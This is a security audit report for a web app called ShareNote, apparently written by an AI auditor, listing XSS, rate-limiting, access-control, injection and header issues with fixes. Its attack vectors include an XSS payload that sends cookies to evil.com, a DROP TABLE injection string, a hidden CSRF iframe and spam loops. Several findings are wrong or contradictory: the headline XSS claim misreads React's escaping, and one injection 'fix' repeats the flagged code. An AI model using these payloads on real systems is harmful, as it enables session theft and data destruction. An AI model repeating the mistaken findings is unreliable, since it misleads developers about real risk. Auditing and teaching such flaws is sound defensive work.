# 🔒 SHARENOTE - SECURITY AUDIT REPORT
**Date:** 2026-06-25  
**Auditor:** Claude (Sonnet 4)  
**Scope:** OWASP Top 10, Access Control, Input Validation, Defense-in-Depth

---

## 📊 EXECUTIVE SUMMARY

### Overall Security Posture: **MODERATE RISK** ⚠️

**Critical Issues:** 2  
**High Risk:** 4  
**Medium Risk:** 6  
**Low Risk:** 3  

**Verdict:** Ứng dụng có RLS policies tốt từ Supabase, nhưng thiếu các lớp bảo vệ frontend quan trọng: input validation, rate limiting, XSS prevention, và error handling an toàn.

---

## 🚨 CRITICAL VULNERABILITIES

### 1. **Stored XSS via Chat Messages** (CRITICAL)
**File:** `src/components/ChatSidebar.jsx:216`

```jsx
<div style={{...}}>
  {msg.content}  // ❌ RAW HTML INJECTION
</div>
```

**Attack Vector:**
```javascript
// Attacker sends:
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
<script>alert('XSS')</script>
```

**Impact:** 
- Cookie theft
- Session hijacking
- Malicious script execution in all chat viewers

**Fix:**
```jsx
// Option 1: Use textContent (recommended)
<div 
  ref={(el) => { if (el) el.textContent = msg.content }}
  style={{...}}
/>

// Option 2: DOMPurify library
import DOMPurify from 'dompurify'
<div 
  dangerouslySetInnerHTML={{ 
    __html: DOMPurify.sanitize(msg.content) 
  }}
/>
```

---

### 2. **No Rate Limiting on Board Creation** (CRITICAL)
**File:** `src/pages/Home.jsx:35`

**Attack Vector:**
```javascript
// Attacker script:
for (let i = 0; i < 10000; i++) {
  createBoard() // Spam database
}
```

**Impact:**
- Database flooding
- Cost explosion (Supabase charges by operations)
- Denial of Service

**Fix:**
```javascript
// Frontend throttling
import { useState, useRef } from 'react'

const createBoard = async () => {
  const now = Date.now()
  const lastCreate = lastCreateRef.current
  
  if (now - lastCreate < 2000) {
    alert('⏳ Please wait 2 seconds between creations')
    return
  }
  
  lastCreateRef.current = now
  // ... rest of logic
}

// Backend: Add Postgres function with rate limit
CREATE OR REPLACE FUNCTION check_rate_limit(user_id uuid)
RETURNS boolean AS $$
DECLARE
  recent_count integer;
BEGIN
  SELECT COUNT(*) INTO recent_count
  FROM boards
  WHERE owner_id = user_id
    AND created_at > NOW() - INTERVAL '1 minute';
  
  RETURN recent_count < 5; -- Max 5 boards per minute
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

---

## 🔴 HIGH RISK ISSUES

### 3. **Broken Access Control - Board Access Bypass**
**File:** `src/pages/Board.jsx:96-101`

**Issue:** Client-side access check can be bypassed via DevTools

```jsx
if (board.owner_id !== user.id && board.public_access === 'restricted') {
  alert('You do not have access to this board.')
  navigate('/') // ❌ Client-side only
  return
}
```

**Attack:**
```javascript
// In browser console:
const originalNavigate = navigate
navigate = () => {} // Disable redirect
// Now can access restricted board
```

**Impact:** Unauthorized board access

**Defense-in-Depth Fix:**
1. **RLS policies already in place ✅** (line 127-131 in SQL)
2. **Add server-side check in Supabase function:**

```sql
-- Create function to validate access
CREATE OR REPLACE FUNCTION can_access_board(board_slug text)
RETURNS boolean AS $$
BEGIN
  RETURN EXISTS (
    SELECT 1 FROM boards
    WHERE unique_slug = board_slug
      AND (
        owner_id = auth.uid()
        OR public_access IN ('viewer', 'editor')
      )
  );
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

3. **Frontend should query this function:**
```javascript
const { data: canAccess } = await supabase.rpc('can_access_board', { 
  board_slug: slug 
})
if (!canAccess) {
  navigate('/')
  return
}
```

---

### 4. **SQL Injection via Realtime Filters**
**File:** `src/pages/Board.jsx:65`

```javascript
filter: `board_id=eq.${boardId}` // ❌ String interpolation
```

**Attack Vector:**
```javascript
// If boardId is controlled:
const boardId = "123'; DROP TABLE boards; --"
// Creates filter: board_id=eq.123'; DROP TABLE boards; --
```

**Status:** **Low actual risk** because `boardId` comes from trusted source (database query), but still bad practice.

**Fix:**
```javascript
// Use parameterized filter
.on('postgres_changes', {
  event: 'INSERT',
  schema: 'public',
  table: 'messages',
  filter: `board_id=eq.${boardId}` // OK if boardId is UUID from DB
})

// Better: Type-safe approach
interface RealtimeFilter {
  column: 'board_id',
  operator: 'eq',
  value: string
}
```

---

### 5. **Sensitive Data Exposure in Console Logs**
**Files:** Multiple locations

```javascript
console.error('[Chat] Load error:', error) // ❌ May leak stack traces
console.error('Lỗi chi tiết từ Database:', error) // ❌ Exposes DB structure
```

**Impact:**
- Stack traces reveal file paths
- Database errors expose table/column names
- Helps attackers map system architecture

**Fix:**
```javascript
// Production-safe logging
const logError = (context, error) => {
  if (import.meta.env.DEV) {
    console.error(`[${context}]`, error)
  } else {
    // Send to monitoring service only
    // Sentry.captureException(error, { tags: { context } })
    console.error(`[${context}] An error occurred`) // Generic message
  }
}

// Usage
logError('Chat Load', error)
```

---

### 6. **Missing CSRF Protection on State-Changing Operations**
**File:** `src/pages/Board.jsx:148`

**Issue:** No CSRF token on delete operation

**Attack Scenario:**
1. Victim logs into ShareNote
2. Attacker sends victim email with hidden iframe:
```html
<iframe style="display:none" src="https://sharenote.vercel.app/board/abc123/delete"></iframe>
```
3. Browser auto-sends victim's cookies → board deleted

**Current Protection:** ✅ **Supabase handles CSRF via JWT tokens** (not cookies)

**Additional Hardening:**
```javascript
// Add explicit CSRF token check (optional)
const handleDeleteBoard = async () => {
  const csrfToken = sessionStorage.getItem('csrf_token')
  const { data, error } = await supabase.rpc('delete_board_with_csrf', {
    board_id: boardId,
    csrf_token: csrfToken
  })
}
```

---

## 🟡 MEDIUM RISK ISSUES

### 7. **No Input Validation on Message Length**
**File:** `src/components/ChatSidebar.jsx:108`

```javascript
content: newMessage.trim() // ❌ No length check
```

**Attack:** Send 10MB message → crash other users' browsers

**Fix:**
```javascript
const MAX_MESSAGE_LENGTH = 5000

const sendMessage = async (e) => {
  e.preventDefault()
  const trimmed = newMessage.trim()
  
  if (!trimmed) return
  if (trimmed.length > MAX_MESSAGE_LENGTH) {
    alert(`Message too long (max ${MAX_MESSAGE_LENGTH} characters)`)
    return
  }
  
  // ... rest of logic
}
```

**Backend constraint:**
```sql
ALTER TABLE messages 
ADD CONSTRAINT message_length_check 
CHECK (char_length(content) <= 5000);
```

---

### 8. **Missing Content-Security-Policy Headers**
**File:** Not implemented

**Impact:** No defense against XSS even if one slips through

**Fix in `vite.config.js`:**
```javascript
export default {
  server: {
    headers: {
      'Content-Security-Policy': [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline'", // Needed for Vite HMR
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "connect-src 'self' https://*.supabase.co wss://*.supabase.co",
        "font-src 'self'",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'"
      ].join('; ')
    }
  }
}
```

---

### 9. **Unvalidated Redirect**
**File:** `src/App.jsx:37`

```javascript
options: { redirectTo: window.location.origin } // ❌ Could be manipulated
```

**Attack:**
```
https://sharenote.vercel.app/?redirect=https://evil.com
```

**Fix:**
```javascript
const ALLOWED_ORIGINS = [
  'http://localhost:5173',
  'https://sharenote.vercel.app'
]

const redirectTo = ALLOWED_ORIGINS.includes(window.location.origin)
  ? window.location.origin
  : 'https://sharenote.vercel.app'
```

---

### 10. **No Timeout on Supabase Operations**
**File:** Multiple

**Issue:** Hanging requests can cause UI freeze

**Fix:**
```javascript
const withTimeout = (promise, ms = 10000) => {
  return Promise.race([
    promise,
    new Promise((_, reject) => 
      setTimeout(() => reject(new Error('Timeout')), ms)
    )
  ])
}

// Usage
try {
  const { data } = await withTimeout(
    supabase.from('boards').select('*'),
    5000
  )
} catch (error) {
  if (error.message === 'Timeout') {
    alert('Request timed out. Please try again.')
  }
}
```

---

### 11. **Email Address Disclosure via Chat**
**File:** `src/components/ChatSidebar.jsx:200`

```javascript
{msg.profiles?.email || 'Unknown'} // ❌ Shows full email
```

**Privacy Issue:** Exposes emails to all board viewers

**Fix:**
```javascript
const displayName = (email) => {
  if (!email) return 'Anonymous'
  if (email === userEmail) return 'You'
  // Show only first part: john@example.com → john@...
  return email.split('@')[0] + '@...'
}

{displayName(msg.profiles?.email)}
```

---

### 12. **Insecure Random Slug Generation**
**File:** `src/pages/Home.jsx:47`

```javascript
const randomSlug = Math.random().toString(36).substring(2, 10)
// ❌ Predictable, collisions possible
```

**Issue:** 
- Only 2.8 trillion combinations (36^8)
- Attacker can brute-force slugs

**Fix:**
```javascript
// Use crypto.randomUUID() or nanoid
import { nanoid } from 'nanoid'

const randomSlug = nanoid(10) // 64^10 = 1.2 quadrillion combinations

// Or use Supabase's gen_random_uuid():
const { data } = await supabase.rpc('generate_board_slug')
```

---

## 🟢 LOW RISK / HARDENING RECOMMENDATIONS

### 13. **Add Subresource Integrity (SRI)**
**File:** `index.html`

**Recommendation:** Add SRI hashes for external scripts

```html
<script 
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7..."
  crossorigin="anonymous"
></script>
```

---

### 14. **Enable HTTPS-Only Cookies**
**Status:** ✅ Supabase already uses httpOnly, secure cookies

---

### 15. **Add Security Headers in Vercel**
**File:** `vercel.json`

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "geolocation=(), microphone=(), camera=()" }
      ]
    }
  ]
}
```

---

## 🛡️ DEFENSE-IN-DEPTH ASSESSMENT

### ✅ What's Working Well:
1. **Row-Level Security (RLS)** - Excellent policies in PostgreSQL
2. **JWT Authentication** - Supabase handles auth securely
3. **HTTPS Everywhere** - Enforced by Vercel/Supabase
4. **Prepared Statements** - Supabase client prevents SQL injection

### ❌ What's Missing:
1. **Input Validation** - No sanitization on user inputs
2. **Rate Limiting** - Can spam board creation/messages
3. **Content Security Policy** - No XSS mitigation headers
4. **Audit Logging** - No trail of who did what
5. **Error Handling** - Exposes stack traces in production
6. **CAPTCHA** - No bot protection on registration

---

## 🎯 PRIORITY REMEDIATION ROADMAP

### Phase 1: Immediate (Critical - 1-2 days)
- [ ] **Fix Stored XSS in chat** (Issue #1)
- [ ] **Add rate limiting on board creation** (Issue #2)
- [ ] **Sanitize all user inputs**

### Phase 2: Short-term (High Risk - 1 week)
- [ ] **Add server-side access validation** (Issue #3)
- [ ] **Remove sensitive error logs** (Issue #5)
- [ ] **Add message length validation** (Issue #7)
- [ ] **Implement CSP headers** (Issue #8)

### Phase 3: Medium-term (Medium Risk - 2 weeks)
- [ ] **Mask email addresses in chat** (Issue #11)
- [ ] **Use cryptographic slug generation** (Issue #12)
- [ ] **Add operation timeouts** (Issue #10)
- [ ] **Implement audit logging**

### Phase 4: Long-term (Hardening - 1 month)
- [ ] **Add CAPTCHA on board creation**
- [ ] **Set up monitoring (Sentry/LogRocket)**
- [ ] **Penetration testing**
- [ ] **Security headers in Vercel**

---

## 📋 COMPLIANCE CHECKLIST

### OWASP Top 10 (2021)
- **A01 Broken Access Control** - ⚠️ Partial (RLS good, frontend weak)
- **A02 Cryptographic Failures** - ✅ Good (Supabase handles)
- **A03 Injection** - ✅ Good (parameterized queries)
- **A04 Insecure Design** - ⚠️ Moderate (missing rate limits)
- **A05 Security Misconfiguration** - ❌ Missing CSP/security headers
- **A06 Vulnerable Components** - ✅ Dependencies up-to-date
- **A07 Auth Failures** - ✅ Good (Supabase OAuth)
- **A08 Data Integrity Failures** - ⚠️ No input validation
- **A09 Logging Failures** - ❌ No audit trail
- **A10 SSRF** - ✅ N/A (no server-side requests)

---

## 🧪 RECOMMENDED SECURITY TESTS

### Manual Testing:
```bash
# 1. XSS in chat
<script>alert(document.cookie)</script>
<img src=x onerror="alert('XSS')">

# 2. SQL Injection (should fail due to RLS)
board_id: "1' OR '1'='1"

# 3. Board creation spam
for i in {1..100}; do curl -X POST .../createBoard; done

# 4. Access bypass
# Try accessing /board/{restricted_slug} without auth
```

### Automated Tools:
```bash
# OWASP ZAP
zaproxy -quickurl https://sharenote.vercel.app

# npm audit
npm audit --production

# Snyk
npx snyk test
```

---

## 💡 ATTACKER MINDSET SCENARIOS

### Scenario 1: "Mass Board Hijack"
1. Create account
2. Spam board creation (10k boards)
3. Use random slug predictor to find others' boards
4. Access via viewer mode, scrape canvas data

**Mitigation:** Rate limiting + cryptographic slugs

---

### Scenario 2: "Chat Phishing via XSS"
1. Join public board
2. Send message: `<a href="https://fake-sharenote-login.com">Your session expired - click to re-login</a>`
3. Users click, enter credentials on fake site

**Mitigation:** Sanitize HTML + CSP headers

---

### Scenario 3: "DoS via Canvas Bomb"
1. Create board with 1GB canvas data
2. Share link
3. Anyone who opens board crashes (OOM)

**Mitigation:** 
```sql
ALTER TABLE boards 
ADD CONSTRAINT canvas_size_limit 
CHECK (pg_column_size(canvas_data) < 10485760); -- 10MB limit
```

---

## 📞 DISCLOSURE & CONTACTS

**Report vulnerabilities to:** security@sharenote.com (if available)

**Bug Bounty:** Not currently available

---

## ✍️ AUDITOR NOTES

This audit was performed via static code analysis and architecture review. A full penetration test with dynamic testing would provide deeper assurance.

**Recommended next steps:**
1. Implement Phase 1 fixes immediately
2. Set up Sentry for error monitoring
3. Schedule professional penetration test
4. Create security.txt file per RFC 9116

---

**End of Report**
